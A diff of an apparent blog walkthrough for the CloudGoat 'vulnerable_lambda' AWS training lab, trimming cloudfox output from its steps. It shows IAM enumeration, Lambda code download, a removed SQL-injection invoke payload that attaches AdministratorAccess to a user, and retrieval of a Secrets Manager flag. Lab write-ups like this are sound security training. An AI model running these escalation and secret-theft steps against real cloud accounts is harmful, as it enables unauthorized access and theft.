@@ -163,7 +163,8 @@ aws-vault exec admin -- aws iam put-role-policy --role-name terraform-cloudgoat 
 {: .prompt-warning }
 
 Finally, we'll configure the profile and IP allowlist for CloudGoat and create
-the scenario. 
+the scenario. The profile should point to the dedicated IAM role we've just 
+created for CloudGoat's Terraform execution. 
 
 ```bash
 ./cloudgoat.py config profile
@@ -673,14 +674,8 @@ we'll repeat the entire exercise using cloudfox.
 What IAM permissions are attached to this IAM user?
 
 ```bash
-> cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp -o csv     
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
-[permissions][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating IAM permissions for account REDACTED.
-[permissions] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/permissions-custom-1673313531.csv]
-[permissions][REDACTED-AIDAW43MRFXB5YQGO4KP4] 5 unique permissions identified.
+cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp -o csv     
 ```
-
-The loot file reads as follows:  
 
 |Service|Principal Type|Name                                     |Policy Type|Policy Name                                                    |Effect|Action                     |Resource                                         |
 |-------|--------------|-----------------------------------------|-----------|---------------------------------------------------------------|------|---------------------------|-------------------------------------------------|
@@ -693,25 +688,17 @@ The loot file reads as follows:
 What are the cg-lambda-invoker roles?
 
 ```bash
-> cloudfox aws principals -o csv
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
-[principals][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating IAM Users and Roles for account REDACTED.
-[principals] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/principals.csv]
+cloudfox aws principals -o csv
 ```
 
 | Service | Type | Name | Arn |
 |-------|------|-----------|-----|
-| IAM | User | cg-bilbo-vulnerable_lambda_cgid73or123swp | arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp |
 | IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp |
-| IAM | Role | vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
 
 What permissions does the cg-lambda-invoker role have?
 
 ```bash
-> cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp -o csv            
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:sts::REDACTED:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp/1673316375681795132
-[permissions][REDACTED-AROAW43MRFXBYDQUWHENX_1673316375681795132] Enumerating IAM permissions for account REDACTED.
-[permissions] Output written to [cloudfox-output/aws/REDACTED-AROAW43MRFXBYDQUWHENX_1673316375681795132/csv/permissions-custom-1673316377.csv]
+cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp -o csv
 ```
 
 | Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
@@ -735,32 +722,18 @@ What permissions does the cg-lambda-invoker role have?
 Before we jump right to downloading the Lambda function itself, let's gather some more information:
 
 ```bash
-> cloudfox aws lambda
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:sts::REDACTED:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgidr0ub7ivite/1675228723550398160
-[lambdas][REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160] Enumerating lambdas for account REDACTED.
-[lambdas] Status: 21/21 regions complete (4 errors -- For details check /home/dominic/.cloudfox/cloudfox-error.log)
-[lambdas] Output written to [cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/table/lambdas.txt]
-[lambdas] Output written to [cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv]
-[lambdas][REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160] Loot written to [cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/loot/lambda-get-function-commands.txt]
-[lambdas][REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160] 1 lambdas found.
-
-cat cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv
-Service,Region,Resource Arn,Role,isAdminRole?
-Lambda,us-east-1,vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,No
+cloudfox aws lambda
 ```
+
+| Service | Region | Resource Arn | Role | IsAdminRole? |
+|---------|--------|--------------|------|--------------|
+| Lambda| us-east-1 | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | No |
 
 What kind of permissions does this role have?
 
 ```bash
-> cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite
-[permissions][REDACTED-AIDAW43MRFXBSQU2U7YWI] Enumerating IAM permissions for account REDACTED.
-[permissions] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXBSQU2U7YWI/table/permissions-custom-1675229085.txt]
-[permissions] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXBSQU2U7YWI/csv/permissions-custom-1675229085.csv]
-[permissions][REDACTED-AIDAW43MRFXBSQU2U7YWI] 5 unique permissions identified.
+cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1
 ```
-
-The results of the output:
 
 | Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
 |---------|----------------|------|-------------|-------------|--------|--------|----------|
@@ -770,8 +743,9 @@ The results of the output:
 | IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogStream | arn:aws:logs:*:*:log-group:*:* |
 | IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:PutLogEvents | arn:aws:logs:*:*:log-group:*:* |
 
-- The `s3:GetObject` and `iam:AttachUserPolicy` actions are of particular interest, but let's review the code to verify this assumption.
-- Luckily for us, cloudfox was kind enough to print out the AWS CLI commands necessary to download the function. We simply need to make some minor tweaks for it to work properly (especially with aws-vault).  
+cloudfox was kind enough to print out the AWS CLI commands necessary to download
+the function. We simply need to make some minor tweaks for it to work properly 
+(especially with aws-vault).  
 
 ```bash
 cat cloudfox-output/aws/REDACTED-AROAW43MRFXBYDQUWHENX_1673316979024011106/loot/lambda-get-function-commands.txt
@@ -791,30 +765,12 @@ mkdir -p ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
 url=`aws --profile $profile lambda get-function --region us-east-1 --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | jq .Code.Location | sed s/"//g` && curl "$url" -o ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1.zip
 ```
 
-- Running the modified commands:
-```bash
-mkdir -p ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
-url=`aws-vault exec cg-lambda-invoker -- aws lambda get-function --region us-east-1 --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | jq .Code.Location | sed s/'"'//g` && curl "$url" -o ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1.zip
-unzip ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1.zip -d ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1
-```
-
-- Follow the rest of the steps using the previously defined AWS CLI commands.
+Exploitation of the SQL injection bug in this Lambda function needs to be done
+manually. Once the AdministratorAccess managed policy has been attache to the 
+bilbo user, we can use the `secrets` cloudfox command to retrieve the flag.
 
 ```bash
-aws-vault exec cg-lambda-invoker -- aws lambda invoke --function-name vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgid73or123swp"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
-```
-
-- To pillage the "flag" for this scenario (Secrets Manager) after applying the managed admin policy to the bilbo IAM user:
-```bash
-aws-vault exec bilbo -- cloudfox aws secrets                  
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
-[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating secrets for account REDACTED.
-[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] Supported Services: SecretsManager, SSM Parameters
-[secrets] Status: 42/42 tasks complete (8 errors -- For details check /home/dominic/.cloudfox/cloudfox-error.log)
-[secrets] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/table/secrets.txt]
-[secrets] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/secrets.csv]
-[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] Loot written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/loot/pull-secrets-commands.txt]
-[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] 1 secrets found.
+cloudfox aws secrets                  
 ```
 
 ```bash
@@ -829,7 +785,10 @@ aws --profile $profile --region us-east-1 secretsmanager get-secret-value --secr
 ```
 
 ```bash
-aws-vault exec bilbo -- aws --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid73or123swp-final_flag
+aws --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid73or123swp-final_flag
+```
+
+```json
 {
     "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgid73or123swp-final_flag-Sif8pD",
     "Name": "vulnerable_lambda_cgid73or123swp-final_flag",
@@ -843,8 +802,3 @@ aws-vault exec bilbo -- aws --region us-east-1 secretsmanager get-secret-value -
 ```
 
 Happy (hacking\|hunting)!
-
-
-# Resources
-- https://github.com/RhinoSecurityLabs/cloudgoat
-- https://github.com/BishopFox/cloudfox
